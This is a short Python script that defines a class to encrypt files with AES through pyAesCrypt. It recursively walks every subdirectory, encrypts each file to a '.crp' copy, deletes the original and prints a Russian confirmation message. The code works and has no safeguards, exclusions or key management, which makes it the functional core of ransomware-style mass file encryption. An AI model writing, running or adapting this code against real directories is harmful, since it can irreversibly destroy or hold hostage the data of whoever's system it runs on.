import pyAesCrypt
import os


class Encryption():
    def encryption(self, file, password):
        self.buffer_size = 521 * 1024

        pyAesCrypt.encryptFile(
            str(file), 
            str(file) + '.crp', 
            password,
            self.buffer_size
        )

        print("[Файл" + str(os.path.splitext(file)[0]) + " зашифрован]")

        os.remove(file)

    
    def walking_by_dirs(self, dir, password):

        for name in os.listdir(dir):
            path = os.path.join(dir, name)

            if os.path.isfile(path):
                try:
                    self.encryption(path, password)
                except Exception as ex:
                    print(ex)
            else:
                self.walking_by_dirs(path, password)
